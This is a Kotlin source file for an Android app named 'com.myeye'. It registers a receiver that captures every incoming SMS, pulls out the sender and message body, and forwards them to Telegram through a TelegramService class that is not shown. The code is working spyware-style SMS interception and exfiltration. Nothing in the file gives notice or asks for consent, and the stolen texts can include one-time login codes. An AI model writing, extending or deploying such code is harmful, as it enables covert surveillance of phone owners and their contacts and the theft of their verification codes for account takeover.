package com.myeye

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle.get("pdus") as Array<*>?
                if (pdus != null) {
                    val messages = arrayOfNulls<SmsMessage>(pdus.size)
                    for (i in pdus.indices) {
                        messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                    }
                    
                    for (message in messages) {
                        if (message != null) {
                            val sender = message.originatingAddress
                            val body = message.messageBody
                            val smsInfo = "SMS From: $sender\nMessage: $body"
                            
                            // Send to Telegram
                            val service = TelegramService()
                            service.sendToTelegram(smsInfo)
                            
                            Log.d("SmsReceiver", smsInfo)
                        }
                    }
                }
            }
        }
    }
}
